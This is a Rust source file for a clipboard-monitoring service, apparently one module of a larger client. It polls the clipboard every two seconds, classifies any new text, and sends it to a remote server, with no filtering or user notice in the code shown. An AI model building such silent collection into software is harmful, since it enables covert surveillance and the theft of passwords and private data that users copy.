//! Clipboard monitoring service.
//!
//! Monitors the system clipboard for changes and reports
//! clipboard content to the server.

use crate::socket::SocketClient;
use arboard::Clipboard as ArboardClipboard;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::RwLock;
use tracing::{debug, error, info, warn};

/// Clipboard monitoring service
#[derive(Clone)]
pub struct Clipboard {
    socket: Arc<SocketClient>,
    is_running: Arc<RwLock<bool>>,
    last_content: Arc<RwLock<String>>,
    monitor_handle: Arc<RwLock<Option<tokio::task::JoinHandle<()>>>>,
}

impl Clipboard {
    /// Create a new clipboard monitor
    pub fn new(socket: Arc<SocketClient>) -> Self {
        Self {
            socket,
            is_running: Arc::new(RwLock::new(false)),
            last_content: Arc::new(RwLock::new(String::new())),
            monitor_handle: Arc::new(RwLock::new(None)),
        }
    }

    /// Start clipboard monitoring
    pub async fn start(&self) {
        if *self.is_running.read().await {
            return;
        }

        *self.is_running.write().await = true;

        let socket = self.socket.clone();
        let is_running = self.is_running.clone();
        let last_content = self.last_content.clone();

        let handle = tokio::spawn(async move {
            info!("Clipboard monitor started");

            // Create clipboard instance
            let clipboard = match ArboardClipboard::new() {
                Ok(cb) => cb,
                Err(e) => {
                    error!("Failed to initialize clipboard: {}", e);
                    return;
                }
            };

            // Wrap in RwLock for interior mutability
            let clipboard = Arc::new(RwLock::new(clipboard));

            loop {
                if !*is_running.read().await {
                    break;
                }

                // Check clipboard content
                Self::check_clipboard(&socket, &clipboard, &last_content).await;

                // Poll every 2 seconds
                tokio::time::sleep(Duration::from_secs(2)).await;
            }

            info!("Clipboard monitor stopped");
        });

        *self.monitor_handle.write().await = Some(handle);
    }

    /// Stop clipboard monitoring
    pub async fn stop(&self) {
        *self.is_running.write().await = false;

        if let Some(handle) = self.monitor_handle.write().await.take() {
            handle.abort();
        }
    }

    /// Check clipboard for changes
    async fn check_clipboard(
        socket: &SocketClient,
        clipboard: &Arc<RwLock<ArboardClipboard>>,
        last_content: &Arc<RwLock<String>>,
    ) {
        // Try to get clipboard text
        let content = {
            let mut cb = clipboard.write().await;
            cb.get_text().ok()
        };

        if let Some(text) = content {
            let last = last_content.read().await;

            // Check if content changed
            if text != *last && !text.is_empty() {
                drop(last);

                // Update last content
                *last_content.write().await = text.clone();

                // Determine content type
                let content_type = Self::detect_content_type(&text);

                // Send to server
                if let Err(e) = socket.send_clipboard(text.clone(), content_type).await {
                    warn!("Failed to send clipboard: {}", e);
                } else {
                    debug!(
                        "Clipboard change detected: {} chars",
                        text.chars().count().min(100)
                    );
                }
            }
        }
    }

    /// Detect the type of clipboard content
    fn detect_content_type(content: &str) -> String {
        // Check for URL
        if content.starts_with("http://")
            || content.starts_with("https://")
            || content.starts_with("ftp://")
        {
            return "url".to_string();
        }

        // Check for email
        if content.contains('@') && content.contains('.') && !content.contains(' ') {
            return "email".to_string();
        }

        // Check for file path
        if content.starts_with('/') || content.starts_with('~') || content.contains(":\\") {
            return "path".to_string();
        }

        // Check for JSON
        if (content.starts_with('{') && content.ends_with('}'))
            || (content.starts_with('[') && content.ends_with(']'))
        {
            if serde_json::from_str::<serde_json::Value>(content).is_ok() {
                return "json".to_string();
            }
        }

        // Check for code (simple heuristic)
        if content.contains("function ")
            || content.contains("def ")
            || content.contains("class ")
            || content.contains("import ")
            || content.contains("const ")
            || content.contains("let ")
            || content.contains("var ")
            || content.contains("fn ")
            || content.contains("pub ")
        {
            return "code".to_string();
        }

        // Default to text
        "text".to_string()
    }

    /// Check if running
    pub async fn is_active(&self) -> bool {
        *self.is_running.read().await
    }
}
